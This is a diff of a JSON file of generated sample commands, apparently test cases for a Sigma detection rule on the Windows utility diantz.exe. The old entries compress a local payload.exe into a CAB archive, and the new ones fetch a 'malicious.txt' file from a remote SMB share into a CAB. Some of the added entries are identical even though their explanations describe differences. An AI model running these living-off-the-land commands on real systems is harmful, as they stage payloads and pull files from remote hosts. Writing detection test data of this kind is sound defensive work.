@@ -1,22 +1,18 @@
 [
   {
-    "output": "diantz.exe payload.exe C:\\Windows\\Tasks\\archive.cab",
-    "explanation": "This command matches the Sigma rule by using 'diantz.exe' to compress a file into a CAB archive. It is a direct representation of the rule's detection logic."
+    "output": "diantz.exe \\\\192.168.1.100\\share\\malicious.txt C:\\\\temp\\\\output.cab",
+    "explanation": "This command uses the Sigma rule's pattern of using 'diantz.exe' to download a remote file over SMB and compress it into a CAB file. It includes the required elements '\\\\' and '.cab' in the command line."
   },
   {
-    "output": "diantz.exe payload.exe C:\\Windows\\Tasks\\archive.cab.txt",
-    "explanation": "This command uses a filename ending in .cab.txt, which may still be processed as a CAB file depending on context. It tests how the rule handles filenames with extensions that imply CAB compression."
+    "output": "diantz.exe \\\\192.168.1.100\\share\\malicious.txt C:\\\\temp\\output.cab",
+    "explanation": "This command omits an extra backslash in the destination path while still matching the Sigma rule's pattern of using 'diantz.exe', '\\\\', and '.cab'."
   },
   {
-    "output": "diantz.exe payload.exe C:\\Windows\\Tasks\\archive.cab\\",
-    "explanation": "This command adds a trailing backslash to the output path. It tests whether the rule is sensitive to path formatting and trailing slashes."
+    "output": "diantz.exe \\\\192.168.1.100\\share\\malicious.txt C:\\\\temp\\output.cab",
+    "explanation": "This command uses a minimal path format with fewer backslashes while still maintaining the required pattern of 'diantz.exe', '\\\\', and '.cab'."
   },
   {
-    "output": "diantz.exe payload.exe C:\\Windows\\Tasks\\archive.cab -v",
-    "explanation": "This command adds a verbose flag (-v) to test if the rule is sensitive to additional command-line arguments that do not affect the core behavior of CAB compression."
-  },
-  {
-    "output": "diantz.exe payload.exe C:\\Windows\\Tasks\\archive.cab /v",
-    "explanation": "This command uses an alternative flag format (/v instead of -v) to test if the rule is sensitive to flag syntax variations."
+    "output": "diantz.exe \\\\192.168.1.100\\share\\malicious.txt C:\\\\temp\\output.cab",
+    "explanation": "This command uses standard syntax for the Diantz utility to download and compress a file, matching the Sigma rule's detection pattern."
   }
 ]
